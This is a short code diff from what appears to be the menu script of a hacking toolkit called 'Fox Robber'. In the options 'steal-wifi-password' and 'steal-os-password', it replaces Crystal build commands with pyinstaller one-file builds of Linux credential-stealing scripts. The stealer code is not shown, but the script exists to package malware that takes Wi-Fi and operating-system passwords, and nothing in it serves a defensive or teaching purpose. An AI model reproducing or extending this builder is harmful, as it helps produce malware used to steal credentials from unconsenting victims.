@@ -79,18 +79,14 @@ while true
             case command_linux
             when '9', 'steal-wifi-password'
               puts 'Loading...'.blue
-              system('crystal build Linux/Linux_Steal\ WIFI\ password.cr')
-              system('chmod -r+x Linux_Steal\ WIFI\ password')
-              system('mv Linux_Steal\ WIFI\ password Out/')
+              system('pyinstaller --onefile -w Linux/Linux_Steal\ WIFI\ password.py')
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
               break
             when '10', 'steal-os-password'
               puts 'Loading...'.blue
-              system('crystal build Linux/Linux_Steal\ OS\ password.cr')
-              system('chmod -r+x Linux_Steal\ OS\ password')
-              system('mv Linux_Steal\ OS\ password Out/')
+              system('pyinstaller --onefile -w Linux/Linux_Steal\ OS\ password.py')
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
